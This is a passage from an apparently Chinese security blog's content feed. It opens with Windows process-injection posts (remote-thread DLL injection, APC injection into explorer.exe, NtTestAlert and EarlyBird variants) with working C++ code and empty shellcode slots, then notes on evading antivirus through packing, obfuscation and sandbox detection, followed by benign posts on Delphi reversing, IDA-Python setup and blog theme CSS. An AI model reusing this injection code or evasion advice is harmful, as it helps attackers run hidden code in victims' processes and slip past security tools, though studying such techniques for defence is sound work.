class="line"><span class="comment">// 向目标进程申请空间存放路径名</span></span><br><span class="line">SIZE_T lpNumberOfBytesWritten = <span class="number">0</span>;</span><br><span class="line">DWORD dwSize = (<span class="built_in">wcslen</span>(DLL_PATH) + <span class="number">1</span>) * <span class="number">2</span>;</span><br><span class="line">LPVOID lpAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, dwSize, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, lpAddress, DLL_PATH, dwSize, &amp;lpNumberOfBytesWritten);</span><br><span class="line"></span><br><span class="line">HANDLE hThread = <span class="built_in">CreateRemoteThread</span>(</span><br><span class="line">hProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, </span><br><span class="line">(LPTHREAD_START_ROUTINE)LoadLibraryW,</span><br><span class="line">lpAddress, <span class="literal">NULL</span>, <span class="literal">NULL</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测调用完毕，释放资源</span></span><br><span class="line"><span class="built_in">WaitForSingleObject</span>(hThread, <span class="number">-1</span>);</span><br><span class="line"><span class="built_in">VirtualFree</span>(lpAddress, dwSize, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="APC注入（内存注入）"><a href="#APC注入（内存注入）" class="headerlink" title="APC注入（内存注入）"></a>APC注入（内存注入）</h2><blockquote><p>线程切换调用异步过程，异步过程回调函数执行</p></blockquote><ul><li><strong>原理</strong>：APC（Asynchronous Procedure Call）异步过程调用，操作系统支持异步过程调用，允许一个进程向另一个进程的执行上下文中插入一个函数（回调函数）的执行，这种机制通常用于异步通信和处理中断，但它也可以被恶意用于注入代码。</li><li><strong>流程</strong>：向目标进程申请内存空间写入恶意代码，使用系统API注册创建一个异步过程调用对象，关联到目标进程，并将写入的恶意代码的入口点注册为异步过程调用的回调函数。等待异步过程调用触发从而执行恶意代码。</li><li><strong>优点</strong>： 不创建新的进程和线程，而是内存写入，利用目标进程的执行流程来执行写入的恶意代码，因此较难被检测。</li><li><strong>缺点</strong>： 注入的程序必须是多线程，部分程序切换线程上下文并不会触发异步过程调用,并且由于异步过程调用的执行依赖于目标进程的上下文切换和调度，可能存在稳定性问题，导致注入失败。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 具体流程：</span></span><br><span class="line"><span class="comment">// 申请空间将恶意代码写入，注册APC对象，设置回调函数为恶意代码入口</span></span><br><span class="line"><span class="comment">//通过进程名-&gt;进程ID-&gt;遍历进程线程-&gt;插入APC-&gt;等待执行</span></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">GetProcessIdByName</span><span class="params">(LPCTSTR lpszProcessName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hSnapshot = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (hSnapshot == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PROCESSENTRY32 pe;</span><br><span class="line">pe.dwSize = <span class="keyword">sizeof</span> pe;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">Process32First</span>(hSnapshot, &amp;pe))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">do</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">lstrcmpi</span>(lpszProcessName, pe.szExeFile) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line"><span class="keyword">return</span> pe.th32ProcessID;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hSnapshot, &amp;pe));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">CloseHandle</span>(hSnapshot);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">GetAllThreadIdByProcessId</span><span class="params">(DWORD dwProcessId)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">DWORD dwBufferLength = <span class="number">1000</span>;</span><br><span class="line">THREADENTRY32 te32 = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">HANDLE hSnapshot = <span class="literal">NULL</span>;</span><br><span class="line">BOOL bRet = TRUE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取线程快照</span></span><br><span class="line">::<span class="built_in">RtlZeroMemory</span>(&amp;te32, <span class="built_in">sizeof</span>(te32));</span><br><span class="line">te32.dwSize = <span class="built_in">sizeof</span>(te32);</span><br><span class="line">hSnapshot = ::<span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPTHREAD, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取第一条线程快照信息</span></span><br><span class="line">bRet = ::<span class="built_in">Thread32First</span>(hSnapshot, &amp;te32);</span><br><span class="line"><span class="keyword">while</span> (bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 获取进程对应的线程ID</span></span><br><span class="line"><span class="keyword">if</span> (te32.th32OwnerProcessID == dwProcessId)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> te32.th32ThreadID;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历下一个线程快照信息</span></span><br><span class="line">bRet = ::<span class="built_in">Thread32Next</span>(hSnapshot, &amp;te32);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">FARPROC pLoadLibrary = <span class="literal">NULL</span>;</span><br><span class="line">HANDLE hThread = <span class="literal">NULL</span>;</span><br><span class="line">HANDLE hProcess = <span class="number">0</span>;</span><br><span class="line">DWORD Threadid = <span class="number">0</span>;</span><br><span class="line">DWORD ProcessId = <span class="number">0</span>;</span><br><span class="line">BYTE DllName[] = <span class="string">&quot;C:\\Users\\Black Sheep\\source\\repos\\ApcInject\\x64\\Debug\\TestDll.dll&quot;</span>;</span><br><span class="line">LPVOID AllocAddr = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">ProcessId = <span class="built_in">GetProcessIdByName</span>(<span class="string">L&quot;explorer.exe&quot;</span>);</span><br><span class="line">hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, <span class="number">0</span>, ProcessId);</span><br><span class="line">pLoadLibrary = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">AllocAddr = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="number">0</span>, <span class="built_in">sizeof</span>(DllName) + <span class="number">1</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, AllocAddr, DllName, <span class="built_in">sizeof</span>(DllName) + <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">Threadid = <span class="built_in">GetAllThreadIdByProcessId</span>(ProcessId);</span><br><span class="line">hThread = <span class="built_in">OpenThread</span>(THREAD_ALL_ACCESS, <span class="number">0</span>, Threadid);</span><br><span class="line"><span class="built_in">QueueUserAPC</span>((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)AllocAddr);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hProcess);</span><br><span class="line"><span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="APC-amp-NtTestAlert-Code-Execute"><a href="#APC-amp-NtTestAlert-Code-Execute" class="headerlink" title="APC &amp; NtTestAlert Code Execute"></a>APC &amp; NtTestAlert Code Execute</h3><p>利用线程初始化时会调用ntdll中的NtTestAlert函数执行清空APC队列，从而执行提前注入好的恶意代码。</p><p><strong>优点</strong>：解决了APC注入恶意带是否执行及执行时间的不确定性.</p><p><strong>缺点</strong>：emmm</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> shellcode[]=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">VOID</span><span class="params">(NTAPI* pNtTestAlert)</span><span class="params">(VOID)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//具体流程：申请空间写入恶意代码，获取线程ID插入APC，调用NtTestAlert（注：这里是当前进程线程示例）</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">pNtTestAlert NtTestAlert = (pNtTestAlert)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtTestAlert&quot;</span>);</span><br><span class="line"></span><br><span class="line">LPVOID lpBaseAddress = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>, <span class="built_in">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(lpBaseAddress, shellcode, <span class="built_in">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line"><span class="built_in">QueueUserAPC</span>((PAPCFUNC)lpBaseAddress, <span class="built_in">GetCurrentThread</span>(), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">NtTestAlert</span>();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="APC注入变种-EarlyBird"><a href="#APC注入变种-EarlyBird" class="headerlink" title="APC注入变种 - EarlyBird"></a>APC注入变种 - EarlyBird</h3><p>EarlyBird是APC注入和线程劫持结合的变种，利用的是线程初始化时会调用ntdll中的NtTestAlert函数执行清空APC队列，从而执行提前注入好的恶意代码。</p><p><strong>优点</strong>：解决了APC注入恶意带是否执行及执行时间的不确定性，并且先于进程入口点提前拿到控制权，可以用来过进程内检测。</p><p><strong>缺点</strong>：需要创建挂起的进程（一般需要为合法&#x2F;白名单进程），容易被检测</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(linker,<span class="string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] = <span class="string">&quot;&quot;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 具体流程：创建挂起进程获得主线程ID，申请空间写入恶意代码，插入APC，调用</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">LPCSTR lpApplication = <span class="string">&quot;C:\\Windows\\notepad.exe&quot;</span>;<span class="comment">//32位机器notepad的位置</span></span><br><span class="line">SIZE_T shellcodeLen = <span class="built_in">sizeof</span>(shellcode);</span><br><span class="line">STARTUPINFO sInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">PROCESS_INFORMATION pInfo = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"><span class="built_in">CreateProcessA</span>(lpApplication, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPSTARTUPINFOA)&amp;sInfo, &amp;pInfo);</span><br><span class="line">HANDLE hProc = pInfo.hProcess;</span><br><span class="line">HANDLE hThread = pInfo.hThread;</span><br><span class="line"> </span><br><span class="line">LPVOID lpvShellAddress = <span class="built_in">VirtualAllocEx</span>(hProc, <span class="literal">NULL</span>, shellcodeLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">PTHREAD_START_ROUTINE ptApcRoutine = (PTHREAD_START_ROUTINE)lpvShellAddress;</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProc, lpvShellAddress, shellcode, shellcodeLen, <span class="literal">NULL</span>);</span><br><span class="line"> </span><br><span class="line"><span class="built_in">QueueUserAPC</span>(<span class="built_in">PAPCFUNC</span>(ptApcRoutine), hThread, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">ResumeThread</span>(hThread);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="SetWindowHook注入（事件-消息-钩子）"><a href="#SetWindowHook注入（事件-消息-钩子）" class="headerlink" title="SetWindowHook注入（事件-消息 钩子）"></a>SetWindowHook注入（事件-消息 钩子）</h2><h2 id="IAT-HOOK注入"><a href="#IAT-HOOK注入" class="headerlink" title="IAT-HOOK注入"></a>IAT-HOOK注入</h2><blockquote><p>参考文章：未完待续。。。</p></blockquote><ul><li><a href="https://bbs.kanxue.com/thread-227075.htm#msg_header_h1_0">https://bbs.kanxue.com/thread-227075.htm#msg_header_h1_0</a></li><li><a href="https://blog.csdn.net/liuhaidon1992/article/details/103816227">https://blog.csdn.net/liuhaidon1992/article/details/103816227</a></li><li><a href="https://xz.aliyun.com/t/10318#toc-13">https://xz.aliyun.com/t/10318#toc-13</a></li><li><a href="https://idiotc4t.com/code-and-dll-process-injection/apc-and-nttestalert-code-execute">https://idiotc4t.com/code-and-dll-process-injection/apc-and-nttestalert-code-execute</a></li></ul><h2 id="关于免杀的一点思路"><a href="#关于免杀的一点思路" class="headerlink" title="关于免杀的一点思路"></a>关于免杀的一点思路</h2><blockquote><p>静态检测 - 基于特征码、白名单签名</p></blockquote><ul><li>加壳</li><li>混淆截断</li><li>分离免杀</li><li>加密算法加密</li><li>无法解壳时大多时候会报毒，（白名单除外）</li></ul><blockquote><p>动态检测 - 沙箱检测</p></blockquote><ul><li>沙箱角度：检测沙箱，沙箱漏洞利用</li><li>病毒自身：延长伪装时间</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Delphi程序逆向</title>
      <link href="/2023/07/13/Delphi%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91/"/>
      <url>/2023/07/13/Delphi%E7%A8%8B%E5%BA%8F%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="Delphi程序逆向"><a href="#Delphi程序逆向" class="headerlink" title="Delphi程序逆向"></a>Delphi程序逆向</h1><p>Delphi是是使用Pascal语言的一种开发工具，类似于MFC，是一种封装好的界面开发环境。</p><h3 id="函数调用约定"><a href="#函数调用约定" class="headerlink" title="函数调用约定"></a>函数调用约定</h3><p>Delphi遵循_fastcall调用约定，但是与Windows的_fastcall略有不同，参数顺序为eax为第一个参数、edx为第二个参数、ecx为第三个参数，大于3个的参数通过堆栈传递，大于三个的堆栈顺序从左到右依次压栈，堆栈由被调用者恢复。</p><h3 id="变量结构定义"><a href="#变量结构定义" class="headerlink" title="变量结构定义"></a>变量结构定义</h3><p>Delphi常用的字符串的内存布局不同于C&#x2F;C++的char*或则string对象，Delphi使用的字符串都是Pascal的字符串，在原始字符串前面存放的是字符串的长度.</p><blockquote><p>逆向建议</p></blockquote><ul><li>控件绑定着响应回调函数，可以在Delphi程序的RCDATA资源中查看到。</li><li>因为IDA针对Delphi库函数识别不高，使用专用反汇编工具解析。使用IDR解析后生成idc脚本文件供IDA导入函数。</li><li>IDA里边设置函数识别库为对应版本的语言函数库</li><li>手动微调：<ul><li>Load a new file,取消勾选的Analysis下的两个自动分析选项</li><li>Options–&gt;Compiler:Compiler（Delphi）、Calling convention(FastCall)</li><li>Options–&gt;General–&gt;String:Default string literal type(Pascal&#x2F;Pascal16)</li><li>View–&gt;View–&gt;Open Subviews–&gt;Type libraries, remove the defaults</li><li>View–&gt;Open Subviews–&gt;Signatures–&gt;Apply new Signatures:选择delphi相关Signatures</li><li>Edit–&gt;Select all,在IDA View区域右键Analyze selected area</li></ul></li></ul><blockquote><p>使用IDR的原因</p></blockquote><ul><li>得益于多个版本的符号bin文件，IDR能够识别大部分Delphi库函数，比IDA的识别率高很多</li><li>默认设置直接解析delphi程序的字符串信息，在IDR Strings可以查看和搜索这些字符串</li><li>可视化查看delphi的RCDATA信息Form界面信息，并且能够直接获得按钮等元素的响应函数地址</li><li>ClassViewer窗口可直接查看部分类及函数名称，猜测这部分函数为RCDATA中声明的函数或则类似C++的RTTI信息</li></ul><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="http://www.youngroe.com/2019/07/01/Windows/delphi_reverse_summary/">Delphi程序逆向反汇编技巧小记</a></p><p><a href="https://www.jb51.net/article/257855.htm">Dephi逆向工具Dede导出函数名MAP导入到IDA中的实现方法_python_脚本之家</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA-Python设置</title>
      <link href="/2023/06/13/IDA-Python%E8%AE%BE%E7%BD%AE/"/>
      <url>/2023/06/13/IDA-Python%E8%AE%BE%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="IDA-Python设置"><a href="#IDA-Python设置" class="headerlink" title="IDA-Python设置"></a>IDA-Python设置</h1><h2 id="版本切换"><a href="#版本切换" class="headerlink" title="版本切换"></a>版本切换</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">py -版本</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">利用环境变量下寻找变量名的方式</span><br><span class="line">更改文件名，从而实现打开不同版本的程序</span><br><span class="line">python27</span><br><span class="line">python37</span><br></pre></td></tr></table></figure><h3 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h3><table><thead><tr><th>变量名</th><th>描述</th></tr></thead><tbody><tr><td>PYTHONPATH</td><td>PYTHONPATH是Python搜索路径，默认我们import的模块都会从PYTHONPATH里面寻找。</td></tr><tr><td>PYTHONSTARTUP</td><td>Python启动后，先寻找PYTHONSTARTUP环境变量，然后执行此变量指定的文件中的代码。</td></tr><tr><td>PYTHONCASEOK</td><td>加入PYTHONCASEOK的环境变量, 就会使python导入模块的时候不区分大小写.</td></tr><tr><td>PYTHONHOME</td><td>另一种模块搜索路径。它通常内嵌于的PYTHONSTARTUP或PYTHONPATH目录中，使得两个模块库更容易切换。</td></tr></tbody></table><p>PYTHONHOME环境变量用于告诉Python解释器其基本安装路径</p><p>PATH用于指定系统查找可执行文件的路径。</p><blockquote><p>所以部分python加载问题中，可以通过添加PYTHONHOME来解决pyhon配置问题</p></blockquote><p>例如：IDA中的import site failure，可以通过设置PYTHONHOME使得指定好PYTHON安装目录，使其加载变量指定文件中的DLL模块及代码。</p><p><a href="https://blog.csdn.net/counsellor/article/details/98968082">idapython: importing “site” failed报错的解决方案_counsellor的博客-CSDN博客</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Butterfly主题美化</title>
      <link href="/2023/02/20/Butterfly%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/"/>
      <url>/2023/02/20/Butterfly%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h2 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h2><blockquote><p>安装</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone -b master [&lt;https://github.com/jerryc127/hexo-theme-butterfly.git&gt;](&lt;https://github.com/jerryc127/hexo-theme-butterfly.git&gt;) themes/butterfly</span><br><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure><p>hexo5.0版本以上：<code>npm i hexo-theme-butterfly</code></p><p>安装渲染：<code>npm install hexo-renderer-pug hexo-renderer-stylus --save</code></p><blockquote><p>修改配置文件</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">theme: butterfly</span><br></pre></td></tr></table></figure><h2 id="自定义样式"><a href="#自定义样式" class="headerlink" title="自定义样式"></a>自定义样式</h2><blockquote><p>外部引入</p></blockquote><ul><li><p><code>项目根路径\\themes\\butterfly\\source\\css\\index.styl</code>中引入自定义的css文件（为避免样式覆盖，放在最下面进行定义），也可在此引入外链css</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 引入自定义css</span><br><span class="line"><span class="keyword">@import</span> <span class="string">&#x27;_custom/*.css&#x27;</span></span><br><span class="line"></span><br><span class="line">// 引入外链</span><br><span class="line">@import <span class="string">&#x27;&lt;https://cdn.jsdelivr.net/gh/username/repo/css/xxx.css&gt;&#x27;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="背景样式"><a href="#背景样式" class="headerlink" title="背景样式"></a>背景样式</h3><blockquote><p>背景样式</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 页脚透明 */</span></span><br><span class="line"><span class="selector-id">#footer</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 页脚黑色透明玻璃效果移除 */</span></span><br><span class="line"><span class="selector-id">#footer</span><span class="selector-pseudo">::before</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 头图透明 */</span></span><br><span class="line"><span class="selector-id">#page-header</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* top-img黑色透明玻璃效果移除，不建议加，除非你执着于完全一图流或者背景图对比色明显 */</span></span><br><span class="line"><span class="selector-id">#page-header</span><span class="selector-pseudo">:not</span>(<span class="selector-class">.not-top-img</span>)<span class="selector-pseudo">:before</span> &#123;</span><br><span class="line"><span class="attribute">background-color</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*夜间模式伪类遮罩层透明*/</span></span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line"><span class="selector-id">#footer</span><span class="selector-pseudo">::before</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-attr">[data-theme=<span class="string">&quot;dark&quot;</span>]</span></span><br><span class="line"><span class="selector-id">#page-header</span><span class="selector-pseudo">::before</span>&#123;</span><br><span class="line"><span class="attribute">background</span>: transparent<span class="meta">!important</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字体样式"><a href="#字体样式" class="headerlink" title="字体样式"></a>字体样式</h3><blockquote><p>字体样式</p></blockquote><p>引用参考：<a href="https://link.juejin.cn/?target=https://fonts.google.com/">谷歌字体库</a>，选择、预览字体，可查看<code>API</code>，引用链接和<code>font-family</code></p><h3 id="鼠标样式"><a href="#鼠标样式" class="headerlink" title="鼠标样式"></a>鼠标样式</h3><blockquote><p>鼠标样式</p></blockquote><p>引用参考：<a href="https://link.juejin.cn/?target=https://zhutix.com/tag/cursors/">致美化</a></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 